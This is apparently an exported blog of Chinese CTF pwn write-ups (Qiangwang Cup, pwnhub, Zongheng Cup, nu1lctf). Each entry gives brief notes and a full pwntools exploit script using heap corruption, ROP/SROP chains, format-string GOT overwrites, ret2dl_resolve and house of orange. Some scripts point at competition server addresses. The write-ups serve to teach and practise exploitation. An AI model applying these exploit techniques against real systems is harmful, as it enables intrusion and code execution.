123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140#coding:utf-8# from libformatstr import FormatStr# py64 = FormatStr(isx64=1) # py64[printf_got] = onegadget# sl(py64.payload(start_read_offset))from pwn import *import syslocal = 1context.terminal=['tmux','splitw','-h']context.arch = 'amd64'if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./babypwn') elf = ELF('./babypwn',checksec = False) libc = elf.libcelse: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s :p.send(s)rc = lambda s :p.recv(s)sl = lambda s :p.sendline(s)ru = lambda s :p.recvuntil(s)sda = lambda a,s :p.sendafter(a,s)sla = lambda a,s :p.sendlineafter(a,s)def leak(name,addr): log.info(name + " --&gt; %s",hex(addr))def choice(idx): sla("&gt;&gt;&gt; ",str(idx))def add(size): choice(1) sla("size:",str(size))def edit(idx,data): choice(3) sla("index:",str(idx)) sda("content:",data)def delete(idx): choice(2) sla("index:",str(idx))def show(idx): choice(4) sla("index:",str(idx))for i in range(7): add(0xf8) #0~6add(0xf8) #7add(0x98) #8add(0x88) #9add(0x108) #10add(0x108) #11for i in range(7): delete(i)edit(9,'a'*0x88) #off-by-nulledit(9,'\x00'*0x80 + p64(0x100+0xa0+0x90))edit(10,'\x00'*0xf0 + p64(0) + p64(0x121))delete(7)delete(10)delete(8)for i in range(7): add(0xf8) #0~6add(0xf8) #7# \x60\x97add(0x28) #10edit(8,'\x60\x97')add(0x98) #11add(0x98) #12 stdoutedit(12,p64(0xfbad1800) + p64(0)*3 + '\x00')libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 0x3ed8b0system = libc_base + libc.sym['system']free_hook = libc_base + libc.sym['__free_hook']setcontext = libc_base + libc.sym['setcontext']pop_rdi = libc_base + 0x000000000002155fpop_rsi = libc_base + 0x0000000000023e6apop_rdx = libc_base + 0x0000000000001b96pop_rax = libc_base + 0x00000000000439c8syscall_ret = libc_base + 0x00000000000d2975_open = libc_base + libc.sym['open']leak("libc_base",libc_base)delete(9) #0x90add(0x1f0) #9edit(9,'\x00'*0x70 + p64(free_hook))add(0x88) #13add(0x88) #14 free_hookpay = p64(setcontext+53) pay += p64(pop_rdi) + p64(3)pay += p64(pop_rsi) + p64(free_hook + 0x78)pay += p64(pop_rdx) + p64(0x20)pay += p64(pop_rax) + p64(0)pay += p64(syscall_ret)pay += p64(pop_rdi) + p64(1)pay += p64(pop_rax) + p64(1)pay += p64(syscall_ret)# print hex(len(pay))pay += 'flag.txt\x00'# print hex(len(pay))# pause()edit(14,pay)frame = SigreturnFrame()frame.rsp = free_hook + 0x8frame.rip = _openframe.rdi = free_hook + 0x78 # "flag.txt" string frame.rsi = 0frame.rdx = 0# frame.rcx = free_hookpay = str(frame)# print hex(len(pay))# pause()edit(11,pay)# debug(0xe69)delete(11)p.interactive() [强网先锋] orwadd函数和delete函数都没有对index进行限制，所以可以越界写 写free@got实现read读shellcode，只能写8个字节，所以只需要控制必需的寄存器就行了，rax，rdi本身为0不需要修改，rdx可由index控制；所以只需要控制rsi寄存器即可。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#coding:utf-8# from libformatstr import FormatStr# py64 = FormatStr(isx64=1) # py64[printf_got] = onegadget# sl(py64.payload(start_read_offset))from pwn import *import syslocal = 1context.terminal=['tmux','splitw','-h']context.arch = 'amd64'if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./pwn')else: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s :p.send(s)rc = lambda s :p.recv(s)sl = lambda s :p.sendline(s)ru = lambda s :p.recvuntil(s)sda = lambda a,s :p.sendafter(a,s)sla = lambda a,s :p.sendlineafter(a,s)def leak(name,addr): log.info(name + " --&gt; %s",hex(addr))def choice(idx): sla("&gt;&gt;",str(idx))def add(idx,size,data): choice(1) sla("index:",str(idx)) sla("size:",str(size)) sda("content:",data)def delete(idx): choice(4) sla("index:",str(idx))# readsrc1 = '''mov rsi,rspsyscalljmp rsp'''pay = asm(src1)print hex(len(pay))pause()# 修改free@got为src1用来读取shellcodeadd(-25,8,pay + '\n')# debug(0xfe7)delete(0x20)shellcode = '''mov rdi,rspadd rdi,0x42mov rsi,0mov rax,2syscallmov rdi,3mov rsi,rspmov rdx,0x20mov rax,0syscallmov rdi,1mov rax,1syscallret'''pause()sl(asm(shellcode) + "flag\x00")#debug()p.interactive() [强网先锋] no_output 输入0x20个字符到src变量中，在后面的strcpy中则会溢出一个0字节覆盖un_804C080为0，获得多一次的输入，绕过sub_8049385的检测进入函数sub_8049269 这里有一个浮点异常信号处理，需要使得v2[0]/v1触发浮点运算异常，且v1不能为0 可以构造分子为无符号最小整数，分母为-1，相除时发生溢出，从而调用目标函数 之后 dl_resolve即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#coding:utf-8# from libformatstr import FormatStr# py64 = FormatStr(isx64=1) # py64[printf_got] = onegadget# sl(py64.payload(start_read_offset))from pwn import *import syslocal = 1context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./test') elf = ELF('./test')else: p = remote("39.105.138.97","1234") elf = ELF('./test')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s :p.send(s)rc = lambda s :p.recv(s)sl = lambda s :p.sendline(s)ru = lambda s :p.recvuntil(s)sda = lambda a,s :p.sendafter(a,s)sla = lambda a,s :p.sendlineafter(a,s)def show(name,addr): log.info(name + " --&gt; %s",hex(addr))sl(p32(0))# pause()sd('a'*0x20) # pause()sl("\x00") #gdb.attach(p,"b *0x080492D2")sl(str(-0x80000000))sl(str(-1))bss = elf.bss()leave_ret = 0x080491a5PLT = 0x8049030rel_plt = 0x8048414elf_dynsym = 0x8048248elf_dynstr = 0x8048318stack_addr = bss + 0x600read_plt = 0x80490C0# write_plt = elf.symbols['write']payload = 'a'*0x48payload += p32(stack_addr)payload += p32(read_plt)payload += p32(leave_ret)payload += p32(0)payload += p32(stack_addr)payload += p32(100)# p.recvuntil("input your name!\n")p.sendline(payload)pause()#伪造dynsym地址：fake_dynsym = stack_addr + 28#hack_rel占用８位，那么payload中就有4*5 + 2*4＝28位align = 0x10 - ((fake_dynsym-elf_dynsym) &amp; 0xf)#((fake_dynsym-elf_dynsym) &amp; 0xf)相当于除0x10后取余数，因为高位的数都能被0x10整除）fake_dynsym = fake_dynsym + align#因为dynsym结构体大小为0x10,这里就是补齐了，使其能被0x10整除#伪造rel地址：hack_rel = stack_addr + 20main_got = elf.got['__libc_start_main']index_dynsym_addr = (fake_dynsym - elf_dynsym)/0x10#能整除了，搞到它在dynsym中的下标值r_info = (index_dynsym_addr&lt;&lt;8) | 0x7 #下标值和末尾的7组合还原成那个info模式hack_rel_can = p32(main_got) + p32(r_info)#ida中也能看到，是rel的两个参数#配置参数，main_got是为了得到libc_base,执行完了dl_runtime_resolve，会把system的真实地址填到main_got指针，也相当于改了got表~，ｒ_info是得到system的libc偏移地址,从fix函数出来就会得到system的真实地址index_offset = hack_rel - rel_plt#stack_addr + 28是要放hack_reld的地址st_name = (fake_dynsym + 0x10) - elf_dynstr#这里加0x10是因为下面的fake_dynsym的参数占用16位，才到system字符串的位置fake_dynsym_can = p32(st_name) + p32(0) + p32(0) + p32(0x12)#配置参数payload = 'aaaa'#栈迁移要pop的ebppayload += p32(PLT)payload += p32(index_offset)#通过偏移调用函数payload += 'aaaa'#下一条将要返回的指令的地址payload += p32(stack_addr + 64)#函数参数,填到64处payload += hack_rel_can #hack_rel的参数（占用８位）payload += 'a'*align #因为align最大为16，这里就当作16位payload += fake_dynsym_can #fake_dynsym的参数(占用16位)payload += 'system\x00'payload += 'a'*(64-len(payload))#填充字符，为了到64的位置payload += '/bin/sh\x00'p.sendline(payload)p.interactive()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020 pwnhub 双蛋内部赛]]></title>
    <url>%2F2021%2F01%2F01%2F2020%20pwnhub%20%E5%86%85%E9%83%A8%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[StupidNoteglibc2.31下的off-by-null，禁用了execve，并且加了点料 这里的off-by-null藏得很深，我也是在放出hint后才找到的 两个大功能： add,delete add限制了size &lt;= 0x200 delete有两种释放堆块的方法，puts-free和edit-free；并且不是简单的调用free，而且通过对free_hook进行赋值为函数地址来实现，这种做法直接导致后面orw时无法通过free_hook结合setcontext来完成； 利用： 1、泄漏堆地址 2、利用off-by-null构造unlink实现overlap，注意glibc-2.31下对size,prev_size都有检测 3、在orw读取flag的时候因为不能用free_hook，所以只能重新找一个适合的地址；最后在exit中找到这样的汇编，所以只要控制了 rip + 0x1cba7 跟 rip + 0x1d1a1，就相当于调用任意函数并且控制了参数 上图的两个地址跟在不同环境还是有点差别的，在桌面版里面我是libc_base + 0x236968跟libc_base + 0x236f68；而在docker里面是libc_base + 0x22c968跟libc_base + 0x22cf68两个环境下相差0xa000；所以猜测偏移为0xa000*n，最终爆出来远程跟本地相差0x14000(=0xa000*2) exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186#coding:utf-8from pwn import *import syslocal = 0context.arch = 'amd64'# context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./pwn') elf = ELF('./pwn',checksec = False) libc = elf.libcelse: p = remote("139.217.102.146","65386") elf = ELF('./pwn',checksec = False) libc = elf.libc#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print ("breakpoint_addr --&gt; " + hex(text_base + 0x4040)) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)rc = lambda s:p.recv(s)sl = lambda s:p.sendline(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def show(name,addr): log.info(name + " --&gt; %s",hex(addr))def choice(idx): sla("choice:\n",str(idx))def add(size,data): choice(1) sla("info:\n",str(size)) sda("Info:\n",data)def delete_show(idx): choice(2) sla("index:\n",str(idx)) choice(2)def delete_edit(idx,data): choice(2) sla("index:\n",str(idx)) choice(1) sda("Info:",data)for i in range(7): add(0xf8,'a')# leak heap delete_show(1)delete_show(0)add(0xf8,'a')add(0xf8,'b')delete_show(0)ru("Info:")heap_base = u64(ru('\n')[:-1].ljust(8,b'\x00')) - 0x361show("heap_base",heap_base)add(0xf8,'a')# 7add(0x68,p64(0) + p64(0x141) + p64(heap_base + 0xae0)*2)add(0x68,'c')add(0x68,'d')add(0xf8,p64(heap_base + 0x9a0)*2)add(0x68,'f')pay = b'a'*0x60 + p64(0x140)delete_edit(9,pay)for i in range(7): delete_show(i)delete_show(10)for i in range(7): add(0xf8,'a')add(0x68,'b')add(0x68,'c')delete_show(8)delete_show(10)ru("Info:")main_arena = u64(ru('\n')[:-1].ljust(8,b'\x00')) - 739malloc_hook = main_arena - 0x10libc_base = malloc_hook - libc.symbols['__malloc_hook']free_hook = libc_base + libc.symbols['__free_hook']setcontext = libc_base + libc.symbols['setcontext']rtld_global = libc_base + libc.symbols['_rtld_global']syscall_ret = libc_base + 0x0000000000066229# show("main_arena",main_arena)show("malloc_hook",malloc_hook) #0x7f54ca4e5b70show("libc_base",libc_base)show("rtld_global",rtld_global)print (hex(libc_base + 0x236f68))print (hex(libc_base + 0x236968))call_addr = libc_base + 0x236f68 - 0x14000 # -0x14000 is remoterdi_addr = call_addr - 0x600pay = p64(0) + p64(0x71) + p64(call_addr) #call addr# pay = p64(0) + p64(0x71) + p64(rtld_global + 3848) #call addrdelete_edit(7,pay)add(0x68,p64(0) + p64(0x71))add(0x68,'b')# 0x0000000000154930: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; # 0x00000000000e4f75: push rdi; ret;# 0x000000000005e650: mov rsp, rdx; ret; # 0x0000000000032b5a: pop rsp; ret# 0x0000000000026b72: pop rdi; ret; # 0x0000000000027529: pop rsi; ret; # 0x000000000011c371: pop rdx; pop r12; ret; # 0x000000000004a550: pop rax; ret; pop_rdi = libc_base + 0x0000000000026b72pop_rsi = libc_base + 0x0000000000027529pop_rdx_r12 = libc_base + 0x000000000011c371pop_rax = libc_base + 0x000000000004a550flag_addr = heap_base + 0x950pay = p64(libc_base + 0x0000000000154930)add(0x68,pay) #calldelete_show(9)delete_show(8)delete_edit(7,p64(0) + p64(0x71) + p64(rdi_addr)) #rdi_addr# delete_edit(7,p64(0) + p64(0x71) + p64(rtld_global + 2312))add(0x68,p64(0) + p64(0x71))# orw "flag"# openpay = p64(pop_rdi) + p64(flag_addr)pay += p64(pop_rsi) + p64(0)pay += p64(pop_rax) + p64(2)pay += p64(syscall_ret)# readpay += p64(pop_rdi) + p64(3)pay += p64(pop_rsi) + p64(flag_addr)pay += p64(pop_rdx_r12) + p64(0x50)*2pay += p64(pop_rax) + p64(0)pay += p64(syscall_ret)# writepay += p64(pop_rdi) + p64(1)pay += p64(pop_rax) + p64(1)pay += p64(syscall_ret)pay += b"flag"add(0x68,'b')delete_show(0)add(0xf8,pay)pay = b""# pay = p64(0x0000000000032b5a + libc_base) #pop rsp;retpay += p64(libc_base + 0x000000000005e650) + p64(rdi_addr + 0x10)# pay += p64(libc_base + 0x000000000005e650) + p64(rtld_global + 3848 + 0x10)pay += p64(0x0000000000032b5a + libc_base) + p64(heap_base + 0x8a0) #pop rsp;retpay += p64(0)*2pay += p64(libc_base + 0x000000000005e650)add(0x68,pay) #rid# debug(0x00000000000018F4)choice(3)# debug()# rip = libc_base + 0x236968# call = libc_base + 0x236f68# libc_base + 0x1ed608p.interactive()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020 pwnhub 公开赛 -- easypwn]]></title>
    <url>%2F2020%2F12%2F26%2Fpwnhub_easypwn%2F</url>
    <content type="text"><![CDATA[蛮有意思的一题，格式化字符串，0x18个字节，2次机会，数据写在栈上； 很显然需要构造循环多次利用格式化字符串漏洞，第一次用来泄漏地址，第二次修改返回地址为main,回到printf处继续利用 但是题目禁用了execv，也就意味着需要通过orw去读取flag，只能构造rop了;用printf去写rop链，这也是比较有意思的地方；每一次回到printf处都有两次任意地址写的机会，一次需要用来修改返回地址，第二次就可以用来写rop了，这个rop写到main的返回地址处即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133#coding:utf-8from pwn import *import syslocal = 1context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./easypwn') elf = ELF('./easypwn',checksec = False) libc = elf.libcelse: p = remote("139.217.102.146","33865") elf = ELF('./easypwn',checksec = False) libc = elf.libc#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)rc = lambda s:p.recv(s)sl = lambda s:p.sendline(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def show(name,addr): log.info(name + " --&gt; %s",hex(addr))# stack ,libc ,textpay = "%14$p-%19$p-%15$p"sla("name?\n",pay)stack = int(ru('-')[:-1],16)buf_stack = stack - 0x68times_stack = stack - 8main_ret_stack = stack + 8libc_start_main = int(ru('-')[:-1],16)libc_base = libc_start_main - 240 - libc.symbols['__libc_start_main']text_base = int(ru('\n')[:-1],16) - 0xd4dpop_rdi = text_base + 0xdd3pop_rsi = 0x00000000000202f8 + libc_basepop_rdx = 0x0000000000001b92 + libc_basepop_rax = 0x000000000003a738 + libc_basesyscall_ret = 0x00000000000bc3f5 + libc_baseflag_addr = text_base + 0x202084show("stack",stack)show("buf_stack",buf_stack)show("main_ret_stack",main_ret_stack)# show("times_stack",times_stack)# show("libc_base",libc_base)show("text_base",text_base)# show("libc_start_main",libc_start_main)show("pop_rdi",pop_rdi)sla("you??\n",str(0x67616c66))# pause()# 回到mainmain = text_base + 0xd10ret_stack = stack - 0x18pay = "%58c%10$hhnAAAAA"pay += p64(ret_stack)# debug(0xc6e)sla("name?\n",pay)sla("you??\n",str(0x67616c66))def change(addr,vaule): if vaule == 0: vaule = 0x100 pay = "%" + str(vaule) + "c%10$hhn" pay = pay.ljust(0x10,"A") pay += p64(addr) sla("name?\n",pay) sla("you??\n",str(0x67616c66)) pay = "%58c%10$hhnAAAAA" pay += p64(ret_stack) sla("name?\n",pay) sla("you??\n",str(0x67616c66))def write(target,vaule): for i in range(8): change(target + i,(vaule &gt;&gt; 8*i) &amp; 0xff)# execv 被禁用了# orwwrite(main_ret_stack,pop_rdi)write(main_ret_stack + 8*1,flag_addr)write(main_ret_stack + 8*2,pop_rsi)write(main_ret_stack + 8*3,0)write(main_ret_stack + 8*4,pop_rax)write(main_ret_stack + 8*5,2)write(main_ret_stack + 8*6,syscall_ret) # open("flag")write(main_ret_stack + 8*7,pop_rdi)write(main_ret_stack + 8*8,3)write(main_ret_stack + 8*9,pop_rsi)write(main_ret_stack + 8*10,flag_addr)write(main_ret_stack + 8*11,pop_rdx)write(main_ret_stack + 8*12,0x30)write(main_ret_stack + 8*13,pop_rax)write(main_ret_stack + 8*14,0)write(main_ret_stack + 8*15,syscall_ret)write(main_ret_stack + 8*16,pop_rdi)write(main_ret_stack + 8*17,1)write(main_ret_stack + 8*18,pop_rsi)write(main_ret_stack + 8*19,flag_addr)write(main_ret_stack + 8*20,pop_rdx)write(main_ret_stack + 8*21,0x30)write(main_ret_stack + 8*22,pop_rax)write(main_ret_stack + 8*23,1)write(main_ret_stack + 8*24,syscall_ret)sla("name?\n","flag\x00"*4 + 'aaa')sla("you??\n",str(0x67616c66))# debug(0xc6e)sla("name?\n","flag\x00"*4 + 'aaa')sla("you??\n",str(0x67616c66))# debug()p.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020纵横杯 pwn writeup]]></title>
    <url>%2F2020%2F12%2F26%2F2020%E7%BA%B5%E6%A8%AA%E6%9D%AF%2F</url>
    <content type="text"><![CDATA[wind_farm_panel堆溢出，没有free，house of orange 一把梭 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151#coding:utf-8from pwn import *import syslocal = 0context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./pwn') elf = ELF('./pwn') libc = elf.libcelse: p = remote("182.92.203.154","28452") elf = ELF('./pwn') libc = elf.libc#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)rc = lambda s:p.recv(s)sl = lambda s:p.sendline(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def pack_file(_flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0, _IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0, _IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _IO_marker = 0, _IO_chain = 0, _fileno = 0, _lock = 0, _wide_data = 0, _mode = 0): file_struct = p32(_flags) + \ p32(0) + \ p64(_IO_read_ptr) + \ p64(_IO_read_end) + \ p64(_IO_read_base) + \ p64(_IO_write_base) + \ p64(_IO_write_ptr) + \ p64(_IO_write_end) + \ p64(_IO_buf_base) + \ p64(_IO_buf_end) + \ p64(_IO_save_base) + \ p64(_IO_backup_base) + \ p64(_IO_save_end) + \ p64(_IO_marker) + \ p64(_IO_chain) + \ p32(_fileno) file_struct = file_struct.ljust(0x88, "\x00") file_struct += p64(_lock) file_struct = file_struct.ljust(0xa0, "\x00") file_struct += p64(_wide_data) file_struct = file_struct.ljust(0xc0, '\x00') file_struct += p64(_mode) file_struct = file_struct.ljust(0xd8, "\x00") return file_structdef pack_file_flush_str_jumps(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr): payload = pack_file(_flags = 0, _IO_read_ptr = 0x61, #smallbin4file_size _IO_read_base = _IO_list_all_ptr-0x10, # unsorted bin attack _IO_list_all_ptr, _IO_write_base = 0, _IO_write_ptr = 1, _IO_buf_base = binsh_addr, _mode = 0, ) payload += p64(_IO_str_jumps_addr-8) # vtable payload += p64(0) # paddding payload += p64(system_addr) return payloaddef get_io_str_jumps_offset(libc): IO_file_jumps_offset = libc.sym['_IO_file_jumps'] IO_str_underflow_offset = libc.sym['_IO_str_underflow'] for ref_offset in libc.search(p64(IO_str_underflow_offset)): possible_IO_str_jumps_offset = ref_offset - 0x20 if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset: # print possible_IO_str_jumps_offset return possible_IO_str_jumps_offsetdef house_of_orange_payload(libc, libc_base): io_str_jump = libc_base + get_io_str_jumps_offset(libc) io_list_all = libc_base + libc.symbols['_IO_list_all'] system = libc_base + libc.symbols['system'] bin_sh = libc_base + next(libc.search('/bin/sh')) payload = pack_file_flush_str_jumps(io_str_jump, io_list_all, system, bin_sh) return payloaddef show(name,addr): log.info(name + " --&gt; %s",hex(addr))def choice(idx): sla("&gt;&gt; ",str(idx))def add(idx,size,data): choice(1) sla("): ",str(idx)) sla("turbine: ",str(size)) sda("name: ",data)def view(idx): choice(2) sla("viewed: ",str(idx))def edit(idx,data): choice(3) sla("turbine: ",str(idx)) sda("input: ",data)pay = 0x108*'a' + p64(0xef1)add(0,0x100,pay)add(1,0xf00,'bbb')add(2,0x80,'a')view(2)ru("turbine is ")main_arena = u64(rc(6).ljust(8,'\x00')) - 1601malloc_hook = main_arena - 0x10libc_base = malloc_hook - libc.symbols['__malloc_hook']show("main_arena",main_arena)show("libc_base",libc_base)pay = house_of_orange_payload(libc,libc_base)edit(0,0x190*'a' + pay)# debug()choice(1)sla("): ",str(3))sla("turbine: ",str(0x100))# debug()p.interactive() shell格式化字符串漏洞，藏在eval -&gt; builtin_cmd -&gt; do_bgfg里面 got表可写，且可向栈写入数据，所以直接改exit@got即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#coding:utf-8from pwn import *import syslocal = 1context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./pwn') elf = ELF('./pwn',checksec = False) libc = elf.libcelse: p = remote("182.92.203.154","35264") elf = ELF('./pwn',checksec = False) libc = elf.libc#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)rc = lambda s:p.recv(s)sl = lambda s:p.sendline(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def show(name,addr): log.info(name + " --&gt; %s",hex(addr))# debug(0x1616)sla("$ ","bg %10$p-%11$p-%303$p")stack = int(ru('-')[:-1],16)buf_stack = stack + 0x4f0text_base = int(ru('-')[:-1],16) - 0x153blibc_start_main = int(ru(':')[:-1],16) - 240libc_base = libc_start_main - libc.symbols['__libc_start_main']exit_got = text_base + elf.got['exit']printf_got = text_base + elf.got['printf']show("stack",stack)show("exit_got",exit_got)show("text_base",text_base)one = [0x45226,0x4527a,0xf0364,0xf1207]main_ret = stack + 0x908onegadget = libc_base + one[0]show("main_ret",main_ret)show("buf_stack",buf_stack)show("onegadget",onegadget)def change_exit(i): offset = (onegadget &gt;&gt; 8*i) &amp; 0xff pay = "bg " pay += "%" + str(offset) + "c%174$hhn" pay = pay.ljust(0x10,"A") pay += p64(exit_got + i) # debug(0x1616) sla("$ ",pay)for i in range(6): change_exit(i)# debug(0x1064)sla("$ ",'quit')p.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020nu1lctf]]></title>
    <url>%2F2020%2F11%2F27%2F2020nu1lctf%2F</url>
    <content type="text"><![CDATA[easywrite程序保护全开，给了libc，有个任意地址写，然后再malloc(0x30) read and free(ptr) 利用思路：写tcache_ptr，修改tcache[0x40] 为 free_hook-0x10，之后覆盖free_hook-0x10为”/bin/sh\x00”，free_hook为system；free(ptr) get shell 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#coding:utf-8from pwn import *import syslocal = 1# context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./easywrite') elf = ELF('./easywrite',checksec = False) libc = elf.libcelse: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print ("breakpoint_addr --&gt; " + hex(text_base + 0x202040)) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)rc = lambda s:p.recv(s)sl = lambda s:p.sendline(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def show(name,addr): log.info(name + " --&gt; %s",hex(addr))ru("gift:")libc_base = int(ru(b"\n").strip(b"\n"),16) - libc.symbols['setbuf']tcache_ptr = libc_base + 0x1f34f0show("libc_base",libc_base)show("tcache_ptr",tcache_ptr)fake = p32(0) + p32(1)fake = fake.ljust(0x12*8,b"\x00")fake += p64(libc_base + libc.symbols['__free_hook'] - 0x10)sla("message:",fake)# debug(0x132D)sda("write?:",p64(tcache_ptr))sla("message?:",b"/bin/sh\x00" + p64(0) + p64(libc_base + libc.symbols['system']))p.interactive() 关于tcache struct attack 可参考: https://xz.aliyun.com/t/6828#toc-7]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020bytectf]]></title>
    <url>%2F2020%2F10%2F26%2F2020bytectf%2F</url>
